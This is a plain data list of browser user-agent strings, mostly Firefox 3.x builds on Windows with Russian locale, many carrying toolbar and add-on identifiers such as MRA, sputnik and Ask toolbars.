Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.6 (build 03270) Firefox/3.5.5
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12
Mozilla/5.0 (X11; U; Linux x86_64; ru; rv:1.9.2.10) Gecko/20101005 Fedora/3.6.10-1.fc14 Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03796) Firefox/3.6.10 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03402) AskTbPTF/3.11.3.15590 Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03797) Firefox/3.6.13 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 RubarToolbar2714 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03278) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.6 (build 03278) Firefox/3.5.16 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbPCW/3.9.1.14019 Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.3.0.97
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03755) Firefox/3.6.13 (.NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 MRA 5.7 (build 03796) Firefox/3.5.16 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03790) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.4.0.46 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 GTB7.1 (.NET CLR 3.5.30729) sputnik 2.2.0.35
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 DefView Firefox/3.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 Firefox/3.5.16 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03773) Firefox/3.6.13 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 MRA 5.5 (build 02743) Firefox/3.6.14 sputnik 2.4.0.20
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03797) Firefox/3.6.13 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02842) Firefox/3.6.10 (.NET CLR 3.5.30729) sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03789) Firefox/3.6.13 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.2.14) Gecko/20110218 AskTbPTV2/3.9.1.14019 Firefox/3.6.14 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.15) Gecko/20101026 AskTbPTV2/3.9.1.14019 Firefox/3.5.15 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) AskTb{TB_NAME}/{TB_VERSION} Firefox/3.6.13 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.3.0.101
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 AskTbFXTV5/3.9.1.14019 Firefox/3.6.13 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.12) Gecko/20101026 AskTbPTV/3.9.1.14019 Firefox/3.6.12 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.14) Gecko/20110218 MRA 5.7 (build 03796) Firefox/3.6.14 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 MRA 5.6 (build 03396) Firefox/3.6.14 ( .NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.14) Gecko/20110218 MRA 5.7 (build 03796) Firefox/3.6.14 ( .NET CLR 3.5.30729; .NET4.0C) sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 MRA 5.7 (build 03797) Firefox/3.6.14 (.NET CLR 3.5.30729) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.17) Gecko/20110121 MRA 5.6 (build 03403) Firefox/3.5.17 ( .NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 MRA 5.7 (build 03796) Firefox/3.6.14 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.14) Gecko/20110218 MRA 5.5 (build 02812) Firefox/3.6.14 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 MRA 5.7 (build 03796) Firefox/3.6.14 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14 sputnik 2.3.0.102
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; ru; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.17) Gecko/20110121 MRA 5.7 (build 03796) Firefox/3.5.17 ( .NET CLR 3.5.30729) sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6 (.NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 RubarToolbar2714
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03638) Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03686) Firefox/3.6.13 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03773) Firefox/3.6.13 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 MRA 5.6 (build 03402) Firefox/3.6.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.6 (build 03278) Firefox/3.6.13 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03796) Firefox/3.6.15 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.17) Gecko/20110121 Firefox/3.5.17
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.5 (build 02842) Firefox/3.6.15 sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03789) Firefox/3.6.13 sputnik 2.3.0.102
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 (F27E94FC-939C-3F55-2227-9CCEE46557AA) Firefox/3.6.15 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 RubarToolbar2714 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03672) AskTbMOV/3.9.1.14019 Firefox/3.6.15 GTB7.1 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03797) Firefox/3.6.15
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03797) Firefox/3.6.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 AskTbSPC2/3.9.1.14019 Firefox/3.6.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 sputnik 2.3.0.76
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03790) Firefox/3.6.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03796) Firefox/3.6.15 ( .NET CLR 3.5.30729) sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.6 (build 03399) Firefox/3.6.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.7 (build 03686) Firefox/3.6
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03797) Firefox/3.6.15 (.NET CLR 3.5.30729) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.9.1.4) Gecko/20091016 Firefox/3.5.4 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03789) Firefox/3.6.15 s024vp
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03773) Firefox/3.6.15
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 FirePHP/0.5
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03658) Firefox/3.6.15 (.NET CLR 3.5.30729) sputnik 2.4.0.46
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 (.NET CLR 3.5.30729) sputnik 2.3.0.101
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.2.0.35
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03672) Firefox/3.6.15 GTB7.1 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03797) Firefox/3.6.15 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03789) Firefox/3.6.15 sputnik 2.3.1.118
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.10) Gecko/20100914 SUSE/3.6.10-30.1 Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.5 (build 02746) Firefox/3.6.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 AskTbPTV2/3.9.1.14019 Firefox/3.6.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.5 (build 02842) Firefox/3.6.15 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.3.0.76
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.15) Gecko/20101026 AskTbFXTV5/3.9.1.14019 Firefox/3.5.15 sputnik 2.3.1.119
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.17) Gecko/20110121 MRA 5.7 (build 03773) Firefox/3.5.17 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.17) Gecko/20110121 MRA 5.6 (build 03402) Firefox/3.5.17 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03796) Firefox/3.6.15 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.2.15) Gecko/20110303 AskTbPTV2/3.9.1.14019 Firefox/3.6.15 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03797) Firefox/3.6.15 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 sputnik 2.4.0.48
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.15) Gecko/20110308 Gentoo Firefox/3.6.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 RubarToolbar2714 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.3 (build 02564) Firefox/3.6.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 BTRS25396 Firefox/3.6.15 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03789) Firefox/3.6.15 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03790) Firefox/3.6.15
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 (.NET CLR 3.5.30729) sputnik 2.3.0.74
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 sputnik 2.4.0.49
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 AskTbPTV2/3.11.3.15590 Firefox/3.6.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.6 (build 03394) Firefox/3.6.15 sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 AskTbNG2V5/3.8.0.12304 Firefox/3.6.15
Mozilla/5.0 (Windows; U; Windows NT 5.0; en-GB; rv:1.9.2.15) Gecko/20110303 MRA 5.5 (build 02842) Firefox/3.6.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 MRA 5.7 (build 03796) Firefox/3.6.15 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.1) Gecko/2008070208 MRA 5.7 (build 03773) Firefox/3.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 AskTbSPC2/3.9.1.14019 Firefox/3.6.16 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 (.NET CLR 3.5.30729) sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03796) Firefox/3.6.16 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03797) Firefox/3.6.16 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729) sputnik 2.4.0.48
Mozilla/5.0 (Windows NT 6.1; rv:2.0) Gecko/20100101 Firefox/4.0 WebMoney Advisor
Mozilla/5.0 (Windows NT 6.0; rv:2.0b12) Gecko/20100101 Firefox/4.0b12
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 Ant.com Toolbar 2.0.1 Firefox/3.6.16 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.5 (build 02842) Firefox/3.6.16
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.18) Gecko/20110319 MRA 5.7 (build 03796) Firefox/3.5.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.18) Gecko/20110319 Firefox/3.5.18 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.6 (build 03403) Firefox/3.6.16 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03796) Firefox/3.6.16 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03797) Firefox/3.6.16 (.NET CLR 3.5.30729) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 sputnik 2.4.0.49
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03796) Firefox/3.6.16 RubarToolbar2714 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.6 (build 03278) AskTbBAV5/3.11.3.15590 Firefox/3.6.16 Glubble/2.1.0.1
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03796) Firefox/3.6.16 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03797) BTRS26718 Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.1) Gecko/2008070208 MRA 5.6 (build 03403) Firefox/3.0.1 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091201 AskTbPTV2/3.9.1.14019 Firefox/3.5.6
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03790) Firefox/3.6.16 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6.3
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 ( .NET CLR 3.5.30729) sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03797) Firefox/3.6.16
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.7) Gecko/20100701 Firefox/3.6.7
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.6 (build 03278) AskTbPTV2/3.11.3.15590 Firefox/3.6.16 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03796) Firefox/3.6.16 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03658) Firefox/3.6.16 sputnik 2.3.0.74
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.18) Gecko/20110319 AskTbPTV2/3.11.3.15590 Firefox/3.5.18 sputnik 2.4.0.48
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.16) Gecko/20110323 Ubuntu/10.04 (lucid) Firefox/3.6.16
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.18) Gecko/20110319 MRA 5.6 (build 03278) Firefox/3.5.18 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.5 (build 02842) Firefox/3.6.16 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 RubarToolbar2714 RubarToolbar
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 RubarToolbar2714
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 sputnik 2.3.1.119
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03797) Firefox/3.6.16 ( .NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03797) Firefox/3.6.16 sputnik 2.4.0.54
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 sputnik 2.4.0.54
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.6 (build 03278) Firefox/3.6.16
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.16) Gecko/20110323 Linux Mint/9 (Isadora) Firefox/3.6.16
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03796) Firefox/3.6.16 (.NET CLR 3.5.30729) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 (.NET CLR 3.5.30729) sputnik 2.3.0.101
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.18) Gecko/20110319 Firefox/3.5.18 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03790) Firefox/3.6.16
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 (.NET CLR 3.5.30729) sputnik 2.3.0.101
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03791) Firefox/3.6.13 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 AskTbNRO/3.11.3.15590 Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.5 (build 02842) Firefox/3.6.10 (.NET CLR 3.5.30729) sputnik 2.4.0.54
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03790) Firefox/3.6.16 sputnik 2.3.0.102
